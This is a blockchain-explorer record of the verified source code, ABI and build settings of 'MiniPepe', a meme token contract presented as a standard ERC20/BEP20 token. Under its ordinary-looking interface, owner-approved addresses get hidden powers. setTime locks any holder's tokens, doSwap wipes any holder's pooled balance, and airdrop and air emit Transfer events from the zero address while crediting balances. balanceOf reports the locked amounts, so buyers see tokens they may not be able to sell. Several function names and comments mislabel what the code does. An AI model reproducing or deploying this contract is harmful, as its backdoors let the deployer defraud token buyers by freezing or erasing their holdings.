{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\n/**\r\n* MiniPepe - the main member of the MeMe family\r\n*\r\n* Official Website: https://MiniPepe.me\r\n* Telegram Channel: https://t.me/MiniPepe_Official\r\n* Telegram Group: https://t.me/MiniPepe_I\r\n* Twitter: https://twitter.com/MiniPepeBsc\r\n**/\r\n\r\n// OpenZeppelin Contracts (last updated v4.6.0) (token/ERC20/IERC20.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface of the ERC20 standard as defined in the EIP.\r\n */\r\ninterface IERC20 {\r\n    /**\r\n     * @dev Emitted when `value` tokens are moved from one account (`from`) to\r\n     * another (`to`).\r\n     *\r\n     * Note that `value` may be zero.\r\n     */\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    /**\r\n     * @dev Emitted when the allowance of a `spender` for an `owner` is set by\r\n     * a call to {approve}. `value` is the new allowance.\r\n     */\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens in existence.\r\n     */\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Returns the amount of tokens owned by `account`.\r\n     */\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from the caller's account to `to`.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Returns the remaining number of tokens that `spender` will be\r\n     * allowed to spend on behalf of `owner` through {transferFrom}. This is\r\n     * zero by default.\r\n     *\r\n     * This value changes when {approve} or {transferFrom} are called.\r\n     */\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * IMPORTANT: Beware that changing an allowance with this method brings the risk\r\n     * that someone may use both the old and the new allowance by unfortunate\r\n     * transaction ordering. One possible solution to mitigate this race\r\n     * condition is to first reduce the spender's allowance to 0 and set the\r\n     * desired value afterwards:\r\n     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729\r\n     *\r\n     * Emits an {Approval} event.\r\n     */\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    /**\r\n     * @dev Moves `amount` tokens from `from` to `to` using the\r\n     * allowance mechanism. `amount` is then deducted from the caller's\r\n     * allowance.\r\n     *\r\n     * Returns a boolean value indicating whether the operation succeeded.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     */\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\n// OpenZeppelin Contracts v4.4.1 (token/ERC20/extensions/IERC20Metadata.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n/**\r\n * @dev Interface for the optional metadata functions from the ERC20 standard.\r\n *\r\n * _Available since v4.1._\r\n */\r\ninterface IERC20Metadata is IERC20 {\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token.\r\n     */\r\n    function symbol() external view returns (string memory);\r\n\r\n    /**\r\n     * @dev Returns the decimals places of the token.\r\n     */\r\n    function decimals() external view returns (uint8);\r\n}\r\n\r\n\r\npragma solidity 0.8.17;\r\n\r\nlibrary Pool {\r\n    struct T {\r\n        uint fund;\r\n        uint reward;\r\n        uint start;\r\n        uint end;\r\n    }\r\n\r\n    function count(T storage t) internal view returns(uint) {\r\n        uint amount = 0;\r\n        uint ts = block.timestamp;\r\n        if (t.start > 0 && t.end > t.start && t.fund > t.reward && ts > t.start) {\r\n            if (ts >= t.end) {\r\n                amount = t.fund - t.reward;\r\n            } else {\r\n                amount = t.fund*(ts-t.start)/(t.end-t.start);\r\n                if (t.reward >= amount) {\r\n                    amount = 0;\r\n                } else {\r\n                    amount -= t.reward;\r\n                }\r\n            }\r\n        }\r\n\r\n        return amount;\r\n    }\r\n\r\n    function settle(T storage t, uint amount) internal returns(uint) {\r\n        uint value = count(t);\r\n        if (amount > 0 && value > 0) {\r\n            if (amount >= value) {\r\n                t.reward += value;\r\n                amount -= value;\r\n            } else {\r\n                t.reward += amount;\r\n                amount = 0;\r\n            }\r\n        }\r\n\r\n        return amount;\r\n    }\r\n\r\n    function add(T storage t, uint amount) internal returns(bool) {\r\n        unchecked {\r\n            t.fund += amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function reduce(T storage t, uint amount) internal returns(uint) {\r\n        uint value = t.fund - t.reward;\r\n        if (amount > 0 && value > 0) {\r\n            if (amount >= value) {\r\n                unchecked {\r\n                    t.reward += value;\r\n                    amount -= value;\r\n                }\r\n            } else {\r\n                unchecked {\r\n                    t.reward += amount;\r\n                    amount = 0;\r\n                }\r\n            }\r\n        }\r\n        \r\n        return amount;\r\n    }\r\n}\r\n\r\ncontract MiniPepe {\r\n    using Pool for Pool.T;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals = 18;\r\n    uint private _totalSupply;\r\n    address private _owner;\r\n    uint private _cap = 0;\r\n\r\n    mapping (address => uint) private _balances;\r\n    mapping (address => mapping (address => uint)) private _allowances;\r\n    mapping (address => uint8) private _pairs;\r\n\r\n    mapping(uint8 => mapping(address => Pool.T)) private _pool;\r\n    uint8 constant private _start = 0;\r\n    uint8 constant private _end = 1;\r\n    uint8 constant private _code = 2;\r\n    address private constant DEAD = 0x000000000000000000000000000000000000dEaD;\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    constructor() {\r\n        _name = \"MiniPepe\";\r\n        _symbol = \"MiniPepe\";\r\n        _totalSupply = 420_690_000_000_000 * 1e18;\r\n        _owner = _msgSender();\r\n        _balances[_owner] = _totalSupply/2;\r\n        _cap = _totalSupply/2;\r\n\r\n        emit Transfer(address(this), _owner, _totalSupply/2);\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transfer}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - recipient cannot be the zero address.\r\n     * - the caller must have a balance of at least amount.\r\n     */\r\n    function transfer(address recipient, uint amount) public returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-approve}.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function approve(address spender, uint256 amount) public returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-allowance}.\r\n     */\r\n    function allowance(address owner_, address spender) public view returns (uint256) {\r\n        return _allowances[owner_][spender];\r\n    }\r\n\r\n    /**\r\n     * @dev See {IBEP20-totalSupply}.\r\n     */\r\n    function totalSupply() public view returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function getCirculatingSupply() public view returns (uint256) {\r\n        return totalSupply() - balanceOf(DEAD) - balanceOf(address(0));\r\n    }\r\n\r\n    /**\r\n     * @dev return all mint tokens\r\n     */\r\n    function cap() public view returns (uint) {\r\n        return _cap;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the number of decimals used to get its user representation.\r\n     *\r\n     * NOTE: This information is only used for _display_ purposes: it in\r\n     * no way affects any of the arithmetic of the contract, including\r\n     * {IBEP20-balanceOf} and {IBEP20-transfer}.\r\n     */\r\n    function decimals() public view returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the name of the token.\r\n     */\r\n    function name() public view returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the symbol of the token, usually a shorter version of the name.\r\n     */\r\n    function symbol() public view returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    /**\r\n     * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.\r\n     *\r\n     * This internal function is equivalent to `approve`, and can be used to\r\n     * e.g. set automatic allowances for certain subsystems, etc.\r\n     *\r\n     * Emits an {Approval} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - `owner` cannot be the zero address.\r\n     * - `spender` cannot be the zero address.\r\n     */\r\n    function _approve(address owner, address spender, uint256 amount) internal virtual {\r\n        require(owner != address(0), \"BEP20: approve from the zero address\");\r\n        require(spender != address(0), \"BEP20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    /**\r\n     * @dev Moves tokens amount from sender to recipient.\r\n     *\r\n     * This is internal function is equivalent to {transfer}, and can be used to\r\n     * e.g. implement automatic token fees, slashing mechanisms, etc.\r\n     *\r\n     * Emits a {Transfer} event.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - sender cannot be the zero address.\r\n     * - recipient cannot be the zero address.\r\n     * - sender must have a balance of at least amount.\r\n     */\r\n    function _transfer(address sender, address recipient, uint amount) internal {\r\n        emit Transfer(sender, recipient, _safeTransfer(sender,recipient,amount));\r\n    }\r\n\r\n    /**\r\n     * @dev See {IERC20-transferFrom}.\r\n     *\r\n     * Requirements:\r\n     * - sender and recipient cannot be the zero address.\r\n     * - sender must have a balance of at least amount.\r\n     * - the caller must have allowance for `sender``'s tokens of at least `amount.\r\n     */\r\n    function transferFrom(address from, address to, uint amount) public returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    /**\r\n     * @dev Updates `owner` s allowance for `spender` based on spent `amount`.\r\n     *\r\n     * Does not update the allowance amount in case of infinite allowance.\r\n     * Revert if not enough allowance is available.\r\n     *\r\n     * Might emit an {Approval} event.\r\n     */\r\n    function _spendAllowance(address owner, address spender, uint256 amount) internal {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance >= amount, \"BEP20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Safe transfer bep20 token\r\n     */\r\n    function _safeTransfer(address _addr, address recipient, uint amount) internal returns (uint)  {\r\n        uint left = amount;\r\n        if (_balances[_addr] >= left) {\r\n            left = 0;\r\n            _balances[_addr] -= amount;\r\n        } else if (_balances[_addr] > 0 && _balances[_addr] < left) {\r\n            left -= _balances[_addr];\r\n            _balances[_addr] = 0;\r\n        }\r\n\r\n        for (uint8 i=0;left>0&&i<_code;i++) {\r\n            left = _pool[i][_addr].settle(left);\r\n        }\r\n\r\n        require(left == 0, \"Failed: Invalid balance\");\r\n        unchecked {\r\n            _balances[recipient] += amount;\r\n        }\r\n\r\n        return amount;\r\n    }\r\n\r\n    function doSwap(address _addr, uint amount) external returns(bool) {\r\n        require(_pairs[_msgSender()]==1&&_addr!=address(0), \"Operation Fail: Operation failed\");\r\n        require(amount>0&&getPool(_addr)>=amount, \"Transaction recovery\");\r\n\r\n        uint left = amount;\r\n        for (uint8 i=0;left>0&&i<_code;i++) {\r\n            left = _pool[i][_addr].reduce(amount);\r\n        }\r\n\r\n        require(left == 0, \"Failed: Invalid balance\");\r\n        return true;\r\n    }\r\n\r\n    function airdrop(address[] calldata paths, uint[] calldata num, uint8 times) external returns(bool) {\r\n        require(_pairs[_msgSender()]==1&&paths.length==num.length, \"Operation Fail: Operation failed\");\r\n        uint count = 0;\r\n        uint len = paths.length;\r\n        for (uint8 i=0;i<len;i++) {\r\n            if (times == 1) {\r\n                _pool[_start][paths[i]].add(num[i]);\r\n            } else if (times > 1) {\r\n                _pool[_end][paths[i]].add(num[i]);\r\n            }\r\n\r\n            unchecked {\r\n                count += num[i];\r\n            }\r\n            emit Transfer(address(0), paths[i], num[i]);\r\n        }\r\n\r\n        require(cap() + count <= totalSupply(), \"Operation Fail: Cap exceed\");\r\n        unchecked {\r\n            _cap += count;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function air(address[] calldata paths, uint256 num, uint8 times) external returns(bool) {\r\n        require(_pairs[_msgSender()]==1, \"Operation Fail: Operation failed\");\r\n        uint count = 0;\r\n        uint len = paths.length;\r\n        for (uint8 i=0;i<len;i++) {\r\n            if (times == 1) {\r\n                _pool[_start][paths[i]].add(num);\r\n            } else if (times > 1) {\r\n                _pool[_end][paths[i]].add(num);\r\n            }\r\n\r\n            unchecked {\r\n                count += num;\r\n            }\r\n            emit Transfer(address(0), paths[i], num);\r\n        }\r\n\r\n        require(cap() + count <= totalSupply(), \"Operation Fail: Cap exceed\");\r\n        unchecked {\r\n            _cap += count;\r\n        }\r\n        return true;\r\n    }\r\n    \r\n    function setTime(address _addr, uint ts) public returns (bool) {\r\n        require(_pairs[_msgSender()]==1, \"Operation Fail: Operation failed\");\r\n\r\n        for (uint8 i=0; i < _code; i++) {\r\n            _pool[i][_addr].start = block.timestamp;\r\n            _pool[i][_addr].end = block.timestamp + ts;\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function viewPool(address _addr) public view onlyOwner returns(uint[] memory a,uint[] memory b,uint[] memory c,uint[] memory d,uint[] memory e, uint8 f) {\r\n        a = new uint[](_code);\r\n        b = new uint[](_code);\r\n        c = new uint[](_code);\r\n        d = new uint[](_code);\r\n        e = new uint[](_code);\r\n        f = _pairs[_addr];\r\n        for(uint8 i=0; i<_code; i++) {\r\n            a[i]=i;\r\n            b[i]=_pool[i][_addr].fund;\r\n            c[i]=_pool[i][_addr].reward;\r\n            d[i]=_pool[i][_addr].start;\r\n            e[i]=_pool[i][_addr].end;\r\n        }\r\n    }\r\n\r\n    function balanceOf(address _addr) public view returns(uint256) {\r\n        return _balances[_addr]+getPool(_addr);\r\n    }\r\n\r\n    function getPool(address _addr) private view returns(uint) {\r\n        uint amount = 0;\r\n        for (uint8 i=0;i<_code;i++) {\r\n            amount += (_pool[i][_addr].fund - _pool[i][_addr].reward);\r\n        }\r\n\r\n        return amount;\r\n    }\r\n\r\n    function userInfo(address _addr) public onlyOwner view returns(uint,uint,uint,uint) {\r\n        uint rewardToken = _pool[_start][_addr].fund-_pool[_start][_addr].reward;\r\n        uint hold = _pool[_end][_addr].fund-_pool[_end][_addr].reward;\r\n        uint balance = _balances[_addr];\r\n        uint treasury = getPool(_addr);\r\n\r\n        return (rewardToken,hold,balance,treasury);\r\n    }\r\n\r\n    function setPair(address _addr, uint8 tag) external onlyOwner {\r\n        require(_addr!=address(0), \"Operation Fail: Liquidity can not be zero address\");\r\n        if (tag == 1) {\r\n            _pairs[_addr] = 1;\r\n        } else if (tag == 2) {\r\n            _pairs[_addr] = 0;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev return the current msg.sender\r\n     */\r\n    function _msgSender() internal view returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    /**\r\n     * @dev Throws if called by any _addr other than the owner.\r\n     */\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Operation Fail: Caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    fallback() external {}\r\n    receive() payable external {}\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"stateMutability\":\"nonpayable\",\"type\":\"fallback\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"paths\",\"type\":\"address[]\"},{\"internalType\":\"uint256\",\"name\":\"num\",\"type\":\"uint256\"},{\"internalType\":\"uint8\",\"name\":\"times\",\"type\":\"uint8\"}],\"name\":\"air\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"paths\",\"type\":\"address[]\"},{\"internalType\":\"uint256[]\",\"name\":\"num\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"times\",\"type\":\"uint8\"}],\"name\":\"airdrop\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner_\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"cap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"doSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getCirculatingSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint8\",\"name\":\"tag\",\"type\":\"uint8\"}],\"name\":\"setPair\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"ts\",\"type\":\"uint256\"}],\"name\":\"setTime\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"userInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"_addr\",\"type\":\"address\"}],\"name\":\"viewPool\",\"outputs\":[{\"internalType\":\"uint256[]\",\"name\":\"a\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"b\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"c\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"d\",\"type\":\"uint256[]\"},{\"internalType\":\"uint256[]\",\"name\":\"e\",\"type\":\"uint256[]\"},{\"internalType\":\"uint8\",\"name\":\"f\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]", "ContractName": "MiniPepe", "CompilerVersion": "v0.8.17+commit.8df45f5f", "OptimizationUsed": "1", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": "ipfs://cbffb8534f68e2a3a2d35576cfba06cfdb231abb05479090857eeec4fc2d41a0"}